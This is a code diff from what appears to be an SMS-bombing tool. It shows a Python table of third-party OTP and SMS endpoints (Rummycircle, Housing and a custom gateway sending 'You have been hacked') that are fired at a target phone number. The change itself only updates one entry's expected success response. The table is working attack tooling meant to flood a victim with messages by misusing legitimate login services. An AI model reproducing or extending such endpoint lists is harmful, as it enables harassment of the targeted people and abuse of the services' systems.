@@ -9,7 +9,7 @@ apidata = {
 
 "Rummycircle":(f"https://www.rummycircle.com/api/fl/auth/v3/getOtp",{"mobile":target,"deviceId":"d6be3862-7659-46c0-98b9-3d13328a243c","deviceName":"","refCode":"","isPlaycircle":"false"},{},"POST",'''success":true'''),
 
-"Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=You%20have%20been%20hacked%20%20%7B-__-%7D",{},"GET",'''000'''),
+"Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=You%20have%20been%20hacked%20%20%7B-__-%7D",{},"GET",'''SMS SEND SUCCESS'''),
 
 "Housing":("https://login.housing.com/api/v2/send-otp",{"phone": f"{target}"},{},"POST","Sent"),
 
